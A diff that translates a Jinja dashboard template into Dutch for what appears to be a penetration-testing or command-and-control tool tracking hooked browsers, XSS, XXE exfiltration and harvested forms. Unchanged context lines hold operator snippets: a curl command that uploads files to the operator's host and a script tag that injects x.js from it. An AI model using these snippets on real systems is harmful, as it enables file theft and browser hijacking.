@@ -8,8 +8,8 @@
 {% block content %}
 <div class="page-title">
   <div>
-    <h1>Operation Dashboard</h1>
-    <div class="breadcrumbs"><a href="/">Home</a> / Dashboard</div>
+    <h1>Operatie Dashboard</h1>
+    <div class="breadcrumbs"><a href="/">Start</a> / Dashboard</div>
   </div>
 </div>
 
@@ -19,7 +19,7 @@
       <div class="kpi">
         <div>
           <div class="val accent-green" id="kpi-agents">0</div>
-          <div class="sub">Active Agents</div>
+          <div class="sub">Actieve agenten</div>
         </div>
       </div>
     </div>
@@ -30,7 +30,7 @@
       <div class="kpi">
         <div>
           <div class="val accent-orange">{{ aantalhooked }}</div>
-          <div class="sub">Hooked Clients</div>
+          <div class="sub">Gehookte clients</div>
         </div>
       </div>
     </div>
@@ -41,7 +41,7 @@
       <div class="kpi">
         <div>
           <div class="val accent-blue">{{ bevindingen|length }}</div>
-          <div class="sub">Findings</div>
+          <div class="sub">Bevindingen</div>
         </div>
       </div>
     </div>
@@ -52,7 +52,7 @@
       <div class="kpi">
         <div>
           <div class="val">{{ notes|length }}</div>
-          <div class="sub">Notes</div>
+          <div class="sub">Notities</div>
         </div>
       </div>
     </div>
@@ -63,7 +63,7 @@
       <div class="kpi">
         <div>
           <div class="val">{{ commands|length }}</div>
-          <div class="sub">Commands</div>
+          <div class="sub">Commando's</div>
         </div>
       </div>
     </div>
@@ -72,8 +72,8 @@
 
 <section class="card mt-14">
   <div class="card-head">
-    <h2>Active Agents</h2>
-    <a href="/dashboard/agents" class="btn btn-link ml-auto fs-12">All agents &rarr;</a>
+    <h2>Actieve agenten</h2>
+    <a href="/dashboard/agents" class="btn btn-link ml-auto fs-12">Alle agenten &rarr;</a>
   </div>
   <div class="card-body">
     <div id="agent-panel" class="agent-panel">
@@ -85,25 +85,25 @@
 <div class="grid cols-2 mt-14">
   <section class="card">
     <div class="card-head">
-      <h2>Quick Actions</h2>
+      <h2>Snelkoppelingen</h2>
     </div>
     <div class="card-body action-row">
-      <a class="btn btn-primary" href="/dashboard/tasks">Run tasks</a>
-      <a class="btn" href="/dashboard/outputs">Outputs</a>
-      <a class="btn" href="/dashboard/findings">Findings</a>
-      <a class="btn" href="/dashboard/files">Files</a>
-      <a class="btn" href="/dashboard/report">Report</a>
+      <a class="btn btn-primary" href="/dashboard/tasks">Taken</a>
+      <a class="btn" href="/dashboard/outputs">Uitvoer</a>
+      <a class="btn" href="/dashboard/findings">Bevindingen</a>
+      <a class="btn" href="/dashboard/files">Bestanden</a>
+      <a class="btn" href="/dashboard/report">Rapport</a>
       <button class="btn" id="btn-scope" type="button">Scope</button>
       <a class="btn" href="/dashboard/admin" target="_blank">Admin</a>
-      <a class="btn" href="/dashboard/recordings">Recordings</a>
-      <a class="btn" href="/dashboard/screen">Screen</a>
-      <a class="btn" href="/dashboard/agents">Agents</a>
+      <a class="btn" href="/dashboard/recordings">Opnames</a>
+      <a class="btn" href="/dashboard/screen">Terminal</a>
+      <a class="btn" href="/dashboard/agents">Agenten</a>
     </div>
   </section>
 
   <section class="card">
     <div class="card-head">
-      <h2>Payload Generators</h2>
+      <h2>Payload generatoren</h2>
     </div>
     <div class="card-body action-row">
       <a class="btn btn-primary" href="/dashboard/reverseshells">Reverse Shells</a>
@@ -121,13 +121,13 @@
 <div class="grid cols-2 mt-14">
   <section class="card">
     <div class="card-head">
-      <h2>Operator Snippets</h2>
+      <h2>Operator fragmenten</h2>
     </div>
     <div class="card-body">
       <div class="snippet">
         <div class="snippet-head">
-          <strong>Current host</strong>
-          <button class="btn btn-link" id="btn-edit-host" type="button">edit</button>
+          <strong>Huidig host</strong>
+          <button class="btn btn-link" id="btn-edit-host" type="button">wijzig</button>
         </div>
         <pre class="code-block" id="snippet-host">{{ appdata.localhost }}</pre>
       </div>
@@ -135,7 +135,7 @@
       <div class="snippet">
         <div class="snippet-head">
           <strong>Upload via curl </strong> <small>(Remove-item alias:curl)</small>
-          <button class="btn btn-link copy-btn" data-copy-target="snippet-upload" type="button">copy</button>
+          <button class="btn btn-link copy-btn" data-copy-target="snippet-upload" type="button">kopieer</button>
         </div>
         <pre class="code-block" id="snippet-upload">curl -F file=@FILENAME {{ appdata.localhost }}/upload</pre>
       </div>
@@ -143,7 +143,7 @@
       <div class="snippet">
         <div class="snippet-head">
           <strong>Inject x.js</strong>
-          <button class="btn btn-link copy-btn" data-copy-target="snippet-xjs" type="button">copy</button>
+          <button class="btn btn-link copy-btn" data-copy-target="snippet-xjs" type="button">kopieer</button>
         </div>
         <pre class="code-block" id="snippet-xjs">&lt;script src="{{ appdata.localhost }}/x.js"&gt;&lt;/script&gt;</pre>
       </div>
@@ -152,8 +152,8 @@
 
   <section class="card">
     <div class="card-head">
-      <h2>Web Telemetry</h2>
-      <a href="/dashboard/xxs" class="btn btn-link ml-auto fs-12">XSS Details &rarr;</a>
+      <h2>Web telemetrie</h2>
+      <a href="/dashboard/xxs" class="btn btn-link ml-auto fs-12">XSS details &rarr;</a>
     </div>
     <div class="card-body">
       <div class="telemetry-compact">
@@ -171,7 +171,7 @@
         </div>
         <div class="telemetry-stat">
           <span class="telemetry-count">{{ aantalhooked }}</span>
-          <span class="telemetry-label">Hooked clients</span>
+          <span class="telemetry-label">Gehookte clients</span>
         </div>
       </div>
       {% if cookies %}
@@ -193,7 +193,7 @@
       <div class="telemetry-compact">
         <div class="telemetry-stat">
           <span class="telemetry-count">{{ xxe_count }}</span>
-          <span class="telemetry-label">Exfiltrations</span>
+          <span class="telemetry-label">Exfiltraties</span>
         </div>
       </div>
     </div>
@@ -208,7 +208,7 @@
       <div class="telemetry-compact">
         <div class="telemetry-stat">
           <span class="telemetry-count">{{ csrf_count }}</span>
-          <span class="telemetry-label">Harvested forms</span>
+          <span class="telemetry-label">Verzamelde formulieren</span>
         </div>
       </div>
     </div>
@@ -223,7 +223,7 @@
       <div class="telemetry-compact">
         <div class="telemetry-stat">
           <span class="telemetry-count">{{ sqli_count }}</span>
-          <span class="telemetry-label">Injections</span>
+          <span class="telemetry-label">Injecties</span>
         </div>
       </div>
     </div>
@@ -248,7 +248,7 @@
 <div class="grid cols-2 mt-14">
   <section class="card">
     <div class="card-head">
-      <h2>Findings (latest)</h2>
+      <h2>Bevindingen (recent)</h2>
     </div>
     <div class="card-body">
       {% if bevindingen %}
@@ -256,8 +256,8 @@
         <thead>
           <tr>
             <th>ID</th>
-            <th>Name</th>
-            <th>Location</th>
+            <th>Naam</th>
+            <th>Locatie</th>
             <th></th>
           </tr>
         </thead>
@@ -267,21 +267,21 @@
             <td>{{ item.id | nulvul }}</td>
             <td>{{ item.naam }}</td>
             <td>{{ item.locatie }}</td>
-            <td><a href="/dashboard/findings/edit/{{ item.id }}">edit</a></td>
+            <td><a href="/dashboard/findings/edit/{{ item.id }}">bewerken</a></td>
           </tr>
           {% endfor %}
         </tbody>
       </table>
       {% else %}
-      <p class="help">No findings yet.</p>
+      <p class="help">Nog geen bevindingen.</p>
       {% endif %}
     </div>
   </section>
 
   <section class="card">
     <div class="card-head">
-      <h2>Notes</h2>
-      <a href="/dashboard/notes" class="btn btn-link ml-auto fs-12">Alle notes</a>
+      <h2>Notities</h2>
+      <a href="/dashboard/notes" class="btn btn-link ml-auto fs-12">Alle notities</a>
     </div>
     <div class="card-body">
       {% if notes %}
@@ -296,7 +296,7 @@
         {% endfor %}
       </ul>
       {% else %}
-      <p class="help">No notes available.</p>
+      <p class="help">Nog geen notities.</p>
       {% endif %}
     </div>
   </section>
@@ -304,11 +304,11 @@
 
 <section class="card mt-14">
   <div class="card-head">
-    <h2>Command Library</h2>
+    <h2>Commando bibliotheek</h2>
     <a href="/dashboard/commands" class="btn btn-link ml-auto fs-12">Volledig overzicht</a>
   </div>
   <div class="card-body">
-    <input id="command-filter" class="form-control" type="text" placeholder="Filter commands..." />
+    <input id="command-filter" class="form-control" type="text" placeholder="Filter commando's..." />
     <div id="command-list" class="command-list mt-10">
       {% for cmd in commands %}
       <details class="command-item" data-command="{{ cmd|lower }}">
@@ -326,7 +326,7 @@
 <div id="host-modal" class="modal-overlay d-none">
   <div class="modal-box">
     <div class="modal-head">
-      <h3>Edit Current Host</h3>
+      <h3>Huidig host wijzigen</h3>
       <button id="btn-host-close" class="modal-close-btn">&times;</button>
     </div>
     <div class="modal-body">
@@ -335,11 +335,11 @@
       <div class="settings-toggles" style="margin-top:16px;border-top:1px solid var(--border,#333);padding-top:12px">
         <label class="d-flex gap-8 align-center fs-13" style="cursor:pointer">
           <input type="checkbox" id="toggle-proxy" />
-          Behind Proxy (trust X-Forwarded-For)
+          Achter proxy (vertrouw X-Forwarded-For)
         </label>
       </div>
       <div class="mt-12 d-flex gap-8 justify-end">
-        <button id="btn-host-save" class="btn btn-primary" type="button">Save</button>
+        <button id="btn-host-save" class="btn btn-primary" type="button">Opslaan</button>
       </div>
     </div>
   </div>
